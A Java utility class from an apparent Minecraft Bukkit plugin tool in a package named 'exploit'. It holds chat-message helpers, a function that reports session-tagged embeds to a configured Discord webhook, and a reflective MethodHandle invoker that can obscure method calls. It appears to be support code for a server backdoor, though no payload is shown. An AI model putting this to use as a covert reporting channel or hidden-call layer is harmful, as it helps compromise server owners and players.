package com.tmquan2508.exploit;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import net.md_5.bungee.api.chat.TextComponent;

import java.io.*;
import java.util.*;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;

public final class BDUtils {
    private BDUtils() {}
    static String sessionId = java.util.UUID.randomUUID().toString().substring(0, 8);

    public static void sendDebug(String log) {
        if (!Config.debug_log) return;
        Bukkit.getConsoleSender().sendMessage(log);
    }

    public static void sendMessage(Player player, String message) {
        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + message);
    }

    public static void sendMessage(Player player, TextComponent message) {
        TextComponent prefix = new TextComponent(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " ");
        player.spigot().sendMessage(prefix, message);
    }

    public static void sendSuccess(Player player, String message) {
        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.GREEN + " " + message);
    }

    public static void sendWarn(Player player, String message) {
        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.YELLOW + " " + message);
    }

    public static void sendError(Player player, String message) {
        player.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.RED + " " + message);
    }

    public static void sendDiscordMessage(DWeb.EmbedObject embed) {
        if (Config.discord_token == null || Config.discord_token.isEmpty()) { return; }
        embed.setFooter("Time: " + new Date() + " â€¢ Session: " + sessionId, null);
        try {
            DWeb webhook = new DWeb(Config.discord_token);
            webhook.addEmbed(embed);
            webhook.execute();
        } catch (IOException ignored) {}
    }

    public static class DynamicInvoker {
        public static <T> T invokeConstructor(Class<T> targetClass, Class<?>[] paramTypes, Object... args) {
            try {
                MethodHandles.Lookup lookup = MethodHandles.lookup();
                MethodType constructorType = MethodType.methodType(void.class, paramTypes);
                MethodHandle handle = lookup.findConstructor(targetClass, constructorType);
                return (T) handle.invokeWithArguments(args);
            } catch (Throwable t) {
                BDUtils.sendDebug("[DynamicInvoker] CRITICAL: Failed to invoke constructor for '" + targetClass.getName() + "': " + stackTrace(t));
                return null;
            }
        }

        public static Object invokeStaticMethod(Class<?> targetClass, String methodName, Class<?> returnType, Class<?>[] paramTypes, Object... args) {
            try {
                MethodHandles.Lookup lookup = MethodHandles.lookup();
                MethodType methodType = MethodType.methodType(returnType, paramTypes);
                MethodHandle handle = lookup.findStatic(targetClass, methodName, methodType);
                return handle.invokeWithArguments(args);
            } catch (Throwable t) {
                BDUtils.sendDebug("[DynamicInvoker] CRITICAL: Failed to invoke static method '" + methodName + "': " + stackTrace(t));
                return null;
            }
        }

        public static Object invokeInstanceMethod(Object target, String methodName, Class<?> returnType, Class<?>[] paramTypes, Object... args) {
            try {
                MethodHandles.Lookup lookup = MethodHandles.lookup();
                MethodType methodType = MethodType.methodType(returnType, paramTypes);
                MethodHandle handle = lookup.findVirtual(target.getClass(), methodName, methodType);
                return handle.bindTo(target).invokeWithArguments(args);
            } catch (Throwable t) {
                BDUtils.sendDebug("[DynamicInvoker] CRITICAL: Failed to invoke instance method '" + methodName + "': " + stackTrace(t));
                return null;
            }
        }

        private static String stackTrace(Throwable e) {
            StringWriter sw = new StringWriter();
            PrintWriter pw = new PrintWriter(sw);
            e.printStackTrace(pw);
            return sw.toString();
        }
    }
}